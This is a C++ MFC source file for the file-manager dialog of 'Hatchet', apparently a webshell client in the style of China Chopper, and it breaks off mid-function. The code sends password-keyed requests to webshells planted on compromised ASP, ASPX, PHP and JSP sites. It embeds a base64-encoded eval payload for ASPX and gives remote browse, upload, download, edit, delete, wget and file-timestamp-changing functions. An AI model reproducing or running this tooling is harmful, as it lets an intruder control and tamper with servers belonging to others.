// FileDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "FileDlg.h"
#include "MainHatchet.h"
#include "WgetDlg.h"


DWORD WINAPI GetFiles(LPVOID lpParam);	//线程
/*
afx_msg void GetFiles(CString szPath, bool bNoDB = false);
void CFileDlg::GetFiles(CString szPath, bool bNoDB)		//bNoDB为真，不进缓存
*/
//////////////////////////////////////////////////////////////////////////
bool bOnFileNewDirectory = false;		//新建目录,失去焦点时判断
bool bOnFileRename = false;
bool bOnFileChangeTime = false;

struct DATA
{
	int subitem;		//点击表头的列数
	CListCtrl* plist;	//listctrl的指针
};
bool fav = false;			//全局变量 初始化为用来控制升序还是降序排列

struct FunFileInfo	//上传下载文件，线程
{
	CString szSiteUrl;
	CString szSitePass;
	int nSiteCode;
	int nSiteScript;
	CString szS1;
	CString szS2;
	CFileDlg* pHwnd;			//OnFileRefresh();		//刷新 调用
};

DWORD WINAPI FunDownDirGetFiles(LPVOID lpParameter);							//下载目录，线程
DWORD WINAPI FunDownloadFile(LPVOID lpParameter);								//下载文件，线程
DWORD WINAPI FunUploadFile(LPVOID lpParameter);									//上传文件，线程
bool			bIsOpenDir;														//下载文件完成，是否打开文件夹。如果下载的是目录打开一次就好。
// CFileDlg 对话框

IMPLEMENT_DYNAMIC(CFileDlg, CDialog)

CFileDlg::CFileDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFileDlg::IDD, pParent)
{

}

CFileDlg::~CFileDlg()
{
	DestroyWindow();
}

void CFileDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_FILE_LIST, m_filelist);
	DDX_Control(pDX, IDC_FILE_TREE, m_dirtree);
	DDX_Control(pDX, IDC_EDIT_FILE_SUBITEM, m_SubItemEdit);
	DDX_Control(pDX, IDC_COMBO_FILEPATH, m_com_file_path);
}


BEGIN_MESSAGE_MAP(CFileDlg, CDialog)
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_READFILES, OnBnClickedReadfiles)
	ON_NOTIFY(NM_CLICK, IDC_FILE_TREE, OnNMClickTree1)
	ON_NOTIFY(NM_DBLCLK, IDC_FILE_LIST, OnNMDblclkList1)
	ON_NOTIFY(NM_RCLICK, IDC_FILE_LIST, OnNMRClickFilelist)
	ON_EN_KILLFOCUS(IDC_EDIT_FILE_SUBITEM, OnKillFocusSubItemEdit)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_FILE_LIST, OnLvnColumnclickList1)
	ON_COMMAND(ID_FILE_REFRESH, OnFileRefresh)				//刷新
	ON_COMMAND(ID_FILE_CLEARCACHE, OnFileClearCache)		//清空缓存
	ON_COMMAND(ID_FILE_NEWDIRECTORY, OnFileNewDirectory)	//新建目录
	ON_COMMAND(ID_FILE_NEWFILE, OnFileNewFile)				//新建文件
	ON_COMMAND(ID_FILE_RENAME, OnFileRename)				//重命名
	ON_COMMAND(ID_FILE_CHANGETIME, OnFileChangeTime)		//更改时间
	ON_COMMAND(ID_FILE_EDITFILE, OnFileEditFile)			//编辑文件
	ON_COMMAND(ID_FILE_DELETEFILES, OnFileDeleteFiles)		//删除文件
	ON_COMMAND(ID_FILE_WGET, OnFileWget)					//WGET
	ON_COMMAND(ID_FILE_UPLOADFILE, OnFileUploadFile)		//上传文件
	ON_COMMAND(ID_FILE_DOWNLOADFILE, OnFileDownloadFile)	//下载文件
	
	ON_COMMAND(ID_FILE_CUT, OnFileCut)						//文件剪切
	ON_COMMAND(ID_FILE_COPY, OnFileCopy)					//文件复制
	ON_COMMAND(ID_FILE_PASTE, OnFilePaste)					//文件粘贴

	ON_WM_DROPFILES()
	//ON_NOTIFY(TVN_SELCHANGED, IDC_FILE_TREE, &CFileDlg::OnTvnSelchangedFileTree)		//返回 TRUE 禁止选择另一项；返回 FALSE 则允许选择另一项。
	ON_NOTIFY(TVN_SELCHANGING, IDC_FILE_TREE, &CFileDlg::OnTvnSelchangingFileTree)		//返回 TRUE 禁止选择另一项；返回 FALSE 则允许选择另一项。
	ON_BN_CLICKED(IDC_UPPERSTORY, &CFileDlg::OnBnClickedUpperstory)
END_MESSAGE_MAP()


// CFileDlg 消息处理程序

void CFileDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	CRect	rcCWnd = rcClient;
	CWnd*	pCWnd   =   GetDlgItem(IDC_UPPERSTORY);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = 2;
		rcCWnd.bottom = 23;
		rcCWnd.right = 27;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_COMBO_FILEPATH);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = 29;
		rcCWnd.bottom = 23;
		rcCWnd.right = rcCWnd.right-77;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_READFILES);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = rcCWnd.right-75;
		rcCWnd.bottom = 23;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_FILE_TREE);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 25;
		rcCWnd.left = 2;
		rcCWnd.bottom = rcCWnd.bottom - 2;
		rcCWnd.right = 248;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_FILE_LIST);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 25;
		rcCWnd.left = 250;
		rcCWnd.bottom = rcCWnd.bottom - 2;
		rcCWnd.right = rcCWnd.right - 2;
		pCWnd->MoveWindow(rcCWnd);
	}
	//////////////////////////////////////////////////////////////////////////	自动改变LIST宽度
	/*
	m_filelist.InsertColumn(0,"FileName",LVCFMT_LEFT,300);
	m_filelist.InsertColumn(1,"Time",LVCFMT_LEFT,150);
	m_filelist.InsertColumn(2,"Size",LVCFMT_LEFT,80);
	m_filelist.InsertColumn(3,"Properties",LVCFMT_LEFT,40);
	*/
	if (pCWnd)
	{
		pCWnd->GetClientRect(rcClient);
		int nWidth = rcClient.Width()-150-80-40-20;
		m_filelist.SetColumnWidth(0, nWidth);
	}
	//////////////////////////////////////////////////////////////////////////
}

BOOL CFileDlg::OnInitDialog()
{
	CDialog::OnInitDialog();	

	GetDlgItem(IDC_UPPERSTORY)->SetFont(&m_FontSample);
	GetDlgItem(IDC_READFILES)->SetFont(&m_FontSample);
	GetDlgItem(IDC_COMBO_FILEPATH)->SetFont(&m_FontSample);
	GetDlgItem(IDC_FILE_TREE)->SetFont(&m_FontSample);
	GetDlgItem(IDC_FILE_LIST)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EDIT_FILE_SUBITEM)->SetFont(&m_FontSample);

	m_edit.SetWindowText( "Files Management" );					//设置状态栏

	szSiteUrl = szGlobal_SiteUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;

	if (nSiteCode == 65001)
	{
		szSiteCode = "UTF-8";
	}
	else if (nSiteCode == 936)
	{
		szSiteCode = "GB2312";
	}
	else if (nSiteCode == 950)
	{
		szSiteCode = "BIG5";
	}else{
		szSiteCode = "";
	}

	szCacheItem = szSiteUrl.Left( szSiteUrl.Find("/", 9) ) +"|";	//初始化 Item
	szCacheItem.Replace("'", "''");

	// TODO:  在此添加额外的初始化
	LRESULT lstyle = m_filelist.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lstyle |= LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES  ; //LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES 
	m_filelist.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)lstyle);


	m_filelist.InsertColumn(0,"FileName",LVCFMT_LEFT,300);
	m_filelist.InsertColumn(1,"Time",LVCFMT_LEFT,150);
	m_filelist.InsertColumn(2,"Size",LVCFMT_LEFT,80);
	m_filelist.InsertColumn(3,"Properties",LVCFMT_LEFT,40);

	m_iImageTree.Create(16, 16, ILC_COLORDDB|ILC_MASK,10, 10);					//树形框，文件夹 列表
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_DRIVE) );
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_DIR) );
	m_dirtree.SetImageList ( &m_iImageTree,TVSIL_NORMAL );

	m_iImageList.Create(16, 16, ILC_COLORDDB|ILC_MASK,10, 10);					//列表框，文件夹 列表
	m_iImageList.Add( AfxGetApp()->LoadIcon(IDI_DIR) );
	m_filelist.SetImageList ( &m_iImageList,LVSIL_SMALL );


	if (GetServerInfo() == false)
	{
		bCloseTab = true;
	}

	m_com_file_path.AddString("C:\\Documents and Settings\\All Users\\");
	m_com_file_path.AddString("C:\\RECYCLER\\");
	m_com_file_path.AddString("C:\\ProgramData\\");
	m_com_file_path.AddString("C:\\WINDOWS\\system32\\");
	m_com_file_path.AddString("C:\\WINDOWS\\temp\\");
	m_com_file_path.AddString("C:\\Program Files\\");
	m_com_file_path.AddString("C:\\Documents and Settings\\");
	m_com_file_path.AddString("C:\\Users\\Public\\");
	m_com_file_path.AddString("/tmp/");

	m_filelist.SetFocus();

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CFileDlg::OnBnClickedReadfiles()
{
	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//设置状态栏
		return;
	}

	CString temp;
	GetDlgItemText(IDC_COMBO_FILEPATH,temp);

	if (IsWin)
	{
		temp.Replace("/","\\");
		///////////////////////////////////////
		//2014.04.03 BUG
		//2014.01.13 BUG
		while(temp.Replace("//","/") != 0)
		{
		}
		while(temp.Replace("\\\\","\\") != 0)
		{
		}
		///////////////////////////////////////
		if (temp.Right(1) != "\\")
		{
			temp += "\\";
		}

		if (temp.Mid(0,1) == "\\")//访问共享文件
		{
			temp = "\\" + temp;
		}
	}else{
		temp.Replace("\\","/");
		///////////////////////////////////////
		//2014.04.03 BUG
		//2014.01.13 BUG
		while(temp.Replace("//","/") != 0)
		{
		}
		while(temp.Replace("\\\\","\\") != 0)
		{
		}
		///////////////////////////////////////
		if (temp.Right(1) != "/")
		{
			temp += "/";
		}
	}

	//2014.04.03 BUG end
	//2014.01.13 BUG end
	//GetFiles(temp);
	GetFiles_szPath = temp;
	GetFiles_bNoDB = false;//默认 false
	bThreadFinish = false;
	CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);
}

bool CFileDlg::GetServerInfo()																//获取服务器信息
{
	CString temp;
	pMydbTmp->Select("select Dat from CACHE where Item='"+ szCacheItem +"base'", MydbTmpArray);
	if (MydbTmpArray.GetSize() == 0)		// 没有缓存数据
	{
		if (nSiteScript == 2)					//ASPX 有编码
		{
			szFileFamatPageCode.Format("%d", nSiteCode);
			temp = szFileGetInfo[nSiteScript-1];
			temp.Replace("%nPageCode%", szFileFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp, nSiteCode, temp, szError);
			
		}else if (nSiteScript == 4)				//JSP 有编码
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=A&z0="+szSiteCode, nSiteCode, temp, szError);
			
		}else{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileGetInfo[nSiteScript-1], nSiteCode, temp, szError);
		}
		if (!bHttpIsOK)
		{
			AfxMessageBox( szError );
			return false;
		}
		pMydbTmp->Execute("INSERT INTO CACHE (Item,Dat) VALUES ('"+ szCacheItem +"base','"+ temp +"')");			//保存缓存
	}else{
		temp = MydbTmpArray.GetAt(0);		// 缓存有数据
	}	

	int posX = temp.Find("\t");
	int posY = temp.Find("\t", posX+1);
	if (posY == -1)
	{
		posY = temp.GetLength();
	}

	WWWRoot = temp.Mid(0,posX);
	if (WWWRoot[0] == '/')
	{
		WWWRoot.Replace("\\","/");
		IsWin = false;
	}else{
		WWWRoot.Replace("/","\\");
		IsWin =true;
	}

	///////////////////////////////////////
	//2014.04.03 BUG	返回的竟然也有多个 斜杠
	while(WWWRoot.Replace("//","/") != 0)
	{
	}
	while(WWWRoot.Replace("\\\\","\\") != 0)
	{
	}
	///////////////////////////////////////

	if (IsWin)
	{
		if (WWWRoot[WWWRoot.GetLength()-1] != '\\')
		{
			WWWRoot = WWWRoot+"\\";
		}

		CStringArray dirs;
		dirs.RemoveAll();
		decodeCString(temp.Mid(posX+1, posY-posX-1), dirs, ':');

		int nIndex=(int)dirs.GetCount();
		if (nIndex > 0)
		{
			int i=0;
			CString Jsptemp;
			while(i < nIndex)
			{
				HTREEITEM m_hRoot;
				m_hRoot = m_dirtree.InsertItem(dirs.GetAt(i)+":", TVI_ROOT,TVI_LAST);
				m_dirtree.Expand(m_hRoot, TVE_EXPAND);
				i++;
			}
		}else{						//2014.04.03 BUG 获取磁盘失败，添加第一个字符
			HTREEITEM m_hRoot;
			m_hRoot = m_dirtree.InsertItem(WWWRoot.Mid(0,1)+":", TVI_ROOT,TVI_LAST);
			m_dirtree.Expand(m_hRoot, TVE_EXPAND);
		}
	}else{
		HTREEITEM m_hRoot = m_dirtree.InsertItem("/", TVI_ROOT,TVI_LAST);			//Linux 插入 /
		if (WWWRoot[WWWRoot.GetLength()-1] != '/')
		{
			WWWRoot = WWWRoot+"/";
		}
	}


//	szSystemInfo = temp.Mid(posY+1, temp.GetLength()-posY-1);			//服务器信息

	SetDlgItemText(IDC_COMBO_FILEPATH, WWWRoot);


	GetFiles_szPath = WWWRoot;
	GetFiles_bNoDB = false;//默认 false
	bThreadFinish = false;
	CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

	return true;
}


void CFileDlg::OnNMDblclkList1(NMHDR *pNMHDR, LRESULT *pResult)											//文件列表框双击进入该文件夹
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CString temp;
	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//设置状态栏
		return;
	}

	GetDlgItemText(IDC_COMBO_FILEPATH,temp);

	LV_ITEM lvitem = {0};
	lvitem.iItem = nList;
	lvitem.iSubItem = 0;
	lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;				//根据图标判断文件类型
	m_filelist.GetItem(&lvitem);

	if (lvitem.iImage== 0)				// 是文件夹
	{
		if (IsWin)
		{
			GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "\\";
			GetFiles_bNoDB = false;//默认 false
			bThreadFinish = false;
			CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

			//GetFiles(temp + m_filelist.GetItemText(nList,0) + "\\");
		}else{
			GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "/";
			GetFiles_bNoDB = false;//默认 false
			bThreadFinish = false;
			CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

			//GetFiles(temp + m_filelist.GetItemText(nList,0) + "/");
		}
	}else{																		// 是文件，编辑文件
		CString szCommonFileType = ".jpg.gif.png.bmp.jpeg.ico.zip.rar.tgz.7z.tar.gz.iso.cab.bz2.jar.dmg.exe.msi.dll.sys.avi.mpeg.mpg.vob.rmvb.wmv.mp3.mp4.3gp.ogg.voc"
			".swf.pdf.flv.fla.psd.doc.docx.xls.xlsx.ppt.pptx.mdb.rtf.";
		CString szFilesTypeName = m_filelist.GetItemText(nList,0);
		szFilesTypeName = szFilesTypeName.Right( rfind(szFilesTypeName, ".") );

		if (szFilesTypeName == "" || szCommonFileType.Find(szFilesTypeName + ".") == -1)
		{
			//AfxMessageBox("文件编辑: "+ temp+ m_filelist.GetItemText(nList,0));
			CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
			szGlobal_SiteUrl = szSiteUrl;
			szGlobal_SitePass = szSitePass;
			nGlobal_SiteScript = nSiteScript;
			nGlobal_SiteCode = nSiteCode;
			szGlobal_SiteFileSave = temp+ m_filelist.GetItemText(nList,0);
			pMainHatchet->AddFileSaveTab();

			*pResult = 0;
			return;
		}else{
			//	弹出 下载
			OnFileDownloadFile();											//下载文件
		}
	}
	m_filelist.SetFocus();
	*pResult = 0;
}

//void CFileDlg::GetFiles(CString szPath, bool bNoDB)		//bNoDB为真，不进缓存
DWORD WINAPI GetFiles(LPVOID lpParam)
{
	CFileDlg* pDlg = (CFileDlg*)lpParam;

	m_edit.SetWindowText( "Reading File: " + pDlg->GetFiles_szPath );					//设置状态栏

	CString temp;
	/*path = C:\WWW\ */

	if (pDlg->m_com_file_path.FindStringExact(-1, pDlg->GetFiles_szPath) == CB_ERR)		//没有记录，插入
	{
		pDlg->m_com_file_path.InsertString(0, pDlg->GetFiles_szPath);
	}
	

	pDlg->m_hNowItem = FindItems(pDlg->m_dirtree, pDlg->GetFiles_szPath, pDlg->IsWin);
	if (pDlg->m_hNowItem == NULL)									//修正文件管理，后续增加的映射磁盘网络磁盘等，显示会有问题。
	{
		if (pDlg->IsWin)
		{
			pDlg->m_hNowItem = pDlg->m_dirtree.InsertItem(pDlg->GetFiles_szPath.Mid(0, 1)+":", TVI_ROOT,TVI_LAST);
			pDlg->m_dirtree.Expand(pDlg->m_hNowItem, TVE_EXPAND);
		}
	}
	
	if(pDlg->m_dirtree.GetItemState(pDlg->m_hNowItem, TVIS_EXPANDED) != TVIS_EXPANDED)// 收缩的
	{
		pDlg->m_dirtree.Expand(pDlg->m_hNowItem, TVE_EXPAND);
	}
	pDlg->m_dirtree.Select(pDlg->m_hNowItem, TVGN_DROPHILITE);		//树形框，跟随
	

	CString szSqlTemp = pDlg->GetFiles_szPath;
	//szSqlTemp.Replace("\\","\\\\");	2015.01.20 IPC BUG
	szSqlTemp.Replace("'","''");

	MydbTmpArray.RemoveAll();
	if (pDlg->GetFiles_bNoDB)
	{
		pMydbTmp->Execute("Delete from CACHE where Item='"+ pDlg->szCacheItem + szSqlTemp +"'");		//清空缓存
	}else{
		pMydbTmp->Select("Select Dat from CACHE where Item='"+ pDlg->szCacheItem + szSqlTemp +"'", MydbTmpArray);				//查询缓存
	}

	if (MydbTmpArray.GetSize() == 0)			// 没有缓存数据
	{
		if (pDlg->nSiteScript == 1)								//	ASP
		{
			temp = UrlEnCode(pDlg->nSiteCode, pDlg->GetFiles_szPath, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileGetFiles[pDlg->nSiteScript-1] + "&z1="+temp, pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 2)							//  ASPX
		{
			pDlg->szFileFamatPageCode.Format("%d", pDlg->nSiteCode);
			temp = MyBase64Encode(pDlg->nSiteCode, pDlg->GetFiles_szPath);
			temp = szFileGetFiles[pDlg->nSiteScript-1] + "&z1="+temp;
			temp.Replace("%nPageCode%", pDlg->szFileFamatPageCode);

			CString szBase64EvalCode = "var D=System.Text.Encoding.GetEncoding("+ pDlg->szFileFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
				"var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{re"
				"turn System.IO.File.GetLastWriteTime(p).ToString(\"yyyy-MM-dd HH:mm:ss\");}for(i in s){P=D+s[i].Name;Response.W"
				"rite(s[i].Name+\"/\\t\"+T(P)+\"\\t0\\t-\\n\");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\""
				"\\t\"+T(P)+\"\\t\"+s[i].Length+\"\\t-\\n\");}";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);
		}else if(pDlg->nSiteScript == 3){							//  PHP
			temp = MyBase64Encode(pDlg->nSiteCode, pDlg->GetFiles_szPath);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileGetFiles[pDlg->nSiteScript-1] + "&z1="+temp, pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=B&z0="+pDlg->szSiteCode+ "&z1="+ UrlEnCode(pDlg->nSiteCode, pDlg->GetFiles_szPath), pDlg->nSiteCode, temp, szError);
		}
		
		if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
		{
			return 0;
		}
		if (!bHttpIsOK)
		{
			AfxMessageBox( szError );
			pDlg->bThreadFinish = true;
			return 0;
		}
		if (temp.Left(8) == "ERROR://")
		{
			m_edit.SetWindowText( temp );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		CString szCathDat = temp;
		szCathDat.Replace("'", "''");
		pMydbTmp->Execute("INSERT INTO CACHE (Item,Dat) VALUES ('"+ pDlg->szCacheItem + szSqlTemp +"','"+ szCathDat +"')");			//保存缓存
	}else{
		temp = MydbTmpArray.GetAt(0);		// 缓存有数据
	}

	pDlg->SetDlgItemText(IDC_COMBO_FILEPATH, pDlg->GetFiles_szPath);			//设置路径地址，移到这里，顺序问题，完成后，设置edit


	pDlg->m_filelist.DeleteAllItems();

	CString szFileNameLine;
	CString szFileName;
	int posX=0;
	int posY=0;
	int nFolder=0,nFile=0;//计数

	CString szIcoTemp = "";

	int posA = 0,			//decodeCString 大数据处理有问题
		posB = 0;
	//////////////////////////////////////////////////////////////////////////
	CString szTreeExistItem = "";						//解决添加树形框内容的	效率问题。
	CString szTreeExistItemTemp = "";
	HTREEITEM hItem = pDlg->m_dirtree.GetChildItem( pDlg->m_hNowItem );
	while ( hItem )		//遍历所有，查找
	{
		szTreeExistItem = szTreeExistItem + "|" + pDlg->m_dirtree.GetItemText(hItem);
		hItem = pDlg->m_dirtree.GetNextItem( hItem, TVGN_NEXT );
	}
	szTreeExistItem = szTreeExistItem + "|";
	if (pDlg->IsWin)
	{
		szTreeExistItem.MakeLower();//转小写比较
	}
	//////////////////////////////////////////////////////////////////////////
	
	while(posA != -1)
	{
		posA = temp.Find("\n", posB + 1);
		if (posA == -1)
		{
			break;
		}

		szFileNameLine = temp.Mid(posB, posA - posB);
		szFileNameLine.TrimLeft();
		szFileNameLine.TrimRight();
		posB = posA;

		posX = szFileNameLine.Find("\t");
		posY = szFileNameLine.Find("\t", posX+1);
		szFileName = szFileNameLine.Mid(0,posX);
		
		if (szFileName != "./" && szFileName != "../" && szFileName != "")
		{
			int m_i = pDlg->m_filelist.GetItemCount();
			int szFileNameLen = szFileName.GetLength();
			if (szFileName[szFileNameLen-1] == '/')			//是文件夹
			{
				nFolder++;
				szFileName.Replace("/","");
				pDlg->m_filelist.InsertItem(m_i, szFileName, 0);

				//		解决效率问题
				szTreeExistItemTemp = szFileName;
				if (pDlg->IsWin)
				{
					szTreeExistItemTemp.MakeLower();//转小写比较
				}
				if ( szTreeExistItem.Find("|"+szTreeExistItemTemp+"|") == -1)	//是否存在，存在就不插入了
				{
					pDlg->m_dirtree.InsertItem(szFileName,1,1, pDlg->m_hNowItem);
					pDlg->m_dirtree.Expand(pDlg->m_hNowItem, TVE_EXPAND);
				}
				
				//m_filelist.SetItemData(m_i,1);					//记录是文件夹还是文件，排序冲突，换成图标判断
			}else{																		//不是文件夹
				nFile++;
				CString szFilesTypeName = szFileName.Right( rfind(szFileName, ".") );
				szFilesTypeName.MakeLower();	//转换小写对比
				int StringArrPosX = GetStringArrPos(&pDlg->szFilesArrCont, szFilesTypeName);
				if (StringArrPosX == -1)									//之前没获取过，需要重新获取图标
				{
					//////////////////////////////////////////////////////////////////////////
					HICON hIcon;
					
					if (szFilesTypeName == ".exe")										//EXE文件
					{
						ExtractIconEx("SHELL32.DLL", 2, NULL, &hIcon, 1);
						if(hIcon)
						{
							pDlg->szFilesArrCont.Add( szFilesTypeName );
							StringArrPosX = pDlg->m_iImageList.Add( hIcon );
						}
					}else if(szFilesTypeName == ".dll" || szFilesTypeName == ".ocx")								//DLL OCX 文件
					{
						ExtractIconEx("SHELL32.DLL", 72, NULL, &hIcon, 1);
						if(hIcon)
						{
							pDlg->szFilesArrCont.Add( szFilesTypeName );
							StringArrPosX = pDlg->m_iImageList.Add( hIcon );
						}
					}else{
						szIcoTemp = "";
						HKEY hKey;
						BYTE byBuffer[1024];
						DWORD dwLen = 1024;
						DWORD htype = REG_SZ;
						if(::RegOpenKeyEx(HKEY_CLASSES_ROOT, szFilesTypeName, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
						{
							if(::RegQueryValueEx(hKey, NULL, 0, &htype, byBuffer, &dwLen) == ERROR_SUCCESS)
							{
								szIcoTemp.Format("%s\\DefaultIcon", byBuffer);
							}
							RegCloseKey (hKey);
						}
						dwLen = 1024;
						if (szIcoTemp != "")
						{
							if(::RegOpenKeyEx(HKEY_CLASSES_ROOT, szIcoTemp, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
							{
								if(::RegQueryValueEx(hKey, NULL, 0, &htype, byBuffer, &dwLen) == ERROR_SUCCESS)
								{
									szIcoTemp.Format("%s", byBuffer);
								}
								RegCloseKey (hKey);
							}
						}
					
						//注意替换掉所有双引号 "
						szIcoTemp.Replace("\"","");
					
						CString strFile,strIndex;
						AfxExtractSubString(strFile, szIcoTemp, 0, ',');
						AfxExtractSubString(strIndex, szIcoTemp, 1, ',');
					
						ExtractIconEx(strFile,atoi(strIndex),NULL,&hIcon,1);

						if(!hIcon)
						{
							//AfxMessageBox("空 111");
							ExtractIconEx("SHELL32.DLL", 0, NULL, &hIcon, 1);
							if(!hIcon)
							{
								//AfxMessageBox("空 333");
							}
						}
						pDlg->szFilesArrCont.Add( szFilesTypeName );
						StringArrPosX = pDlg->m_iImageList.Add( hIcon );
						//////////////////////////////////////////////////////////////////////////
					}
				}else{
					//AfxMessageBox("已经获取过了: "+szFileName);
					StringArrPosX++;
				}
				pDlg->m_filelist.InsertItem(m_i, szFileName, StringArrPosX);					//已经获取过了图标，直接用
				//m_filelist.SetItemData(m_i,0);					//记录是文件夹还是文件，排序冲突，换成图标判断
			}

			pDlg->m_filelist.SetItemText(m_i, 1,szFileNameLine.Mid(posX+1, posY-posX-1));

			posX = szFileNameLine.Find("\t", posY+1);
			pDlg->m_filelist.SetItemText(m_i, 2,szFileNameLine.Mid(posY+1, posX-posY-1));
			
			pDlg->m_filelist.SetItemText(m_i, 3,szFileNameLine.Mid(posX+1, szFileNameLine.GetLength()-posX-1));
		}
	}
	CString sz_edit;
	sz_edit.Format("Folder(%d),File(%d)", nFolder, nFile);
	m_edit.SetWindowText( sz_edit );					//设置状态栏

	pDlg->bThreadFinish = true;
	pDlg->m_filelist.SetFocus();
	return 0;
}

void CFileDlg::OnNMRClickFilelist(NMHDR *pNMHDR, LRESULT *pResult)			//右键弹出
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	nSelectList = m_filelist.GetNextItem(-1,LVNI_SELECTED);

	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CMenu *p=popMenu.GetSubMenu(4);
	ASSERT(p!=NULL);
	CPoint pt;
	GetCursorPos(&pt);
	p->TrackPopupMenu(TPM_RIGHTBUTTON, pt.x, pt.y,this);
	
	*pResult = 0;
}

void CFileDlg::OnFileRefresh()				//刷新
{
	m_edit.SetWindowText( "Refreshing" );					//设置状态栏

	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//设置状态栏
		return;
	}

	CString szOnFileRefreshtemp;
	GetDlgItemText(IDC_COMBO_FILEPATH,szOnFileRefreshtemp);
	if (szOnFileRefreshtemp != "")
	{
		GetFiles_szPath = szOnFileRefreshtemp;
		GetFiles_bNoDB = true;//默认 false
		bThreadFinish = false;
		CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

		//GetFiles(szOnFileRefreshtemp, true);
	}
}

void CFileDlg::OnFileNewFile()				//新建文件
{
	CString szOnFileNewFile;
	GetDlgItemText(IDC_COMBO_FILEPATH, szOnFileNewFile);
	
	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	szGlobal_SiteUrl = szSiteUrl;
	szGlobal_SitePass = szSitePass;
	nGlobal_SiteScript = nSiteScript;
	nGlobal_SiteCode = nSiteCode;
	
	if (IsWin)
	{
		szGlobal_SiteFileSave = szOnFileNewFile.Mid(0, szOnFileNewFile.GetLength() - rfind(szOnFileNewFile, "\\")+1) + "Newfile^_^.txt";
	}else{
		szGlobal_SiteFileSave = szOnFileNewFile.Mid(0, szOnFileNewFile.GetLength() - rfind(szOnFileNewFile, "/")+1) + "Newfile^_^.txt";
	}
	
	pMainHatchet->AddFileSaveTab();
}

void CFileDlg::OnFileRename()									//重命名
{
	if(nSelectList != -1)
	{
		bOnFileRename = true;					//失去焦点,判断要不要

		CRect rect,dlgRect;
		/*
		获得当前列的宽度以适应如果用户调整宽度
		此处不用获得的子项rect矩形框来设置宽度
		是因第一列时返回的宽度是整行的宽度，我也不知道为啥
		*/
		int width = m_filelist.GetColumnWidth(0);
		m_filelist.GetSubItemRect(nSelectList, 0, LVIR_BOUNDS,rect);

		//获得listctrl矩形框
		//获得父对话框的位置以调整CEdit的显示位置，具体见下面代码
		m_filelist.GetWindowRect(&dlgRect);
